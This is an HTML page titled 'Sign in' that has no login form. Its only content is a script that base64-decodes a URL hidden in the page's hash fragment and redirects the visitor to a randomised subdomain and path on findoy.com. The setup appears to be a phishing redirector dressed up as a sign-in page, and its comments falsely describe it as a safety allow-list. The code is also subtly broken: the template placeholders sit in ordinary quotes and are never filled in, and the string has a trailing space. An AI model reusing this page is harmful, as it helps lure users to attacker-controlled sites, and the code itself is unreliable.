<html>
<head><title>Sign in</title></head>
<body>
    <script>
        function generateRandomId(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; // Characters to choose from
            let result = '';
            
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length); // Generate a random index
                result += characters.charAt(randomIndex); // Append the character at the random index
            }
            
            return result;
        }
        const randomId = generateRandomId(4);
        const random = generateRandomId(6);
        // List of allowed domains or paths for redirection
        const allowedDomains = [
        'https://${randomId}.findoy.com/${random}/a1d6 ',
        ];

        // Retrieve and decode the hash from the URL
        const encodedHash = window.location.hash.substr(1); // Remove '#'
        try {
            // Decode from Base64
            const decodedUrl = window.atob(encodedHash);
            
            // Check if the decoded URL is allowed
            if (allowedDomains.includes(decodedUrl)) {
                // Redirect only if it matches an allowed domain or path
                window.location.href = decodedUrl;
            } else {
                console.warn('Unrecognized or unsafe redirect URL');
            }
        } catch (error) {
            console.error('Error decoding the URL:', error);
        }
    </script> 
</body>
</html>
